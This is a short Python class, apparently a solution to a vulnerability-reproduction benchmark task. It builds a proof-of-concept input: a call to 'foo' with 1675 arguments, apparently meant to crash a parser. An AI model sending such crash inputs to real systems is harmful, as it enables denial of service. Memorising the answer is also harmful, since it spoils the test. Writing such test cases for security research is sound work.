class Solution:
    def solve(self, src_path: str) -> bytes:
        N = 1675
        args = ','.join(str(i) for i in range(N))
        poc = f"foo({args})".encode('utf-8')
        return poc